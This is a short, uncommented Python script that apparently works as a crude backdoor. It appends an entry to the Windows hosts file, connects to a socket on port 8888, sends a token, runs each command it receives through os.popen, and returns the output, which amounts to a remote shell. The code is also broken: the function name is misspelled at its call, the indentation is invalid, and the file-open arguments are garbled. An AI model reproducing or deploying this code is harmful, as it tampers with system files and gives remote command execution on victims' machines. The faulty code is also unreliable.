from distutils.util import change_root
from http import client
from pydoc import cli
import socket
import os
 def chenge_hosts(): 
     file = open("C:\\Windows\\System32\\drivers\\etc\\hosts:, 'a+'")
     file.write("142.112.16.16 127.0.0.1")
     file.close()

change_hosts()

host = "127.0.0.1"
port = 8888

client = socket.socket()
client.connect((host ,port))

client.send("45tf5frf4frfr".encode())
result = os.popen (client.recv(1024).decode())
client.send(result.read().encode())
client.close()

